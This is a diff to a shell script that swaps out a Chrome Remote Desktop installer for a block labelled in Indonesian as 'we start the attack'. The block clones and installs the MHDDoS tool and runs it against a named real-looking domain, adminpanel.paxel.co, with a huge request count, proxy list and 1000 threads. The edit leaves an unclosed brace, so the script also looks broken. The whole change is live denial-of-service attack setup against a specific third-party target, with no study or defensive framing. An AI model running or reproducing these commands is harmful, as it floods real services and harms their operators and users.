@@ -62,18 +62,12 @@ else
     exit
 fi
 
-# Installing Chrome Remote Desktop
-printf "\n$g$b    Installing Chrome Remote Desktop $endc$enda" >&2
+# kita mulai penyerangan
+printf "\n$g$b    kita mulai penyerangan $endc$enda" >&2
 {
-    wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
-    sudo dpkg --install chrome-remote-desktop_current_amd64.deb
-    sudo apt install --assume-yes --fix-broken
-} &> /dev/null &&
-printf "\r$c$b    Chrome Remote Desktop Installed $endc$enda\n" >&2 ||
-{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }
-
 ! git clone https://github.com/MHProDev/MHDDoS.git
 ! cd MHDDoS
 ! pip3 install -r requirements.txt
 ! python3 start.py
-! python3 start.py ovh https://beta.welovecloudflare.de 1 100000000 proxy.txt 1000 8585
+! python3 start.py ovh https://adminpanel.paxel.co 1 10000000000 proxy.txt 1000 8585
+
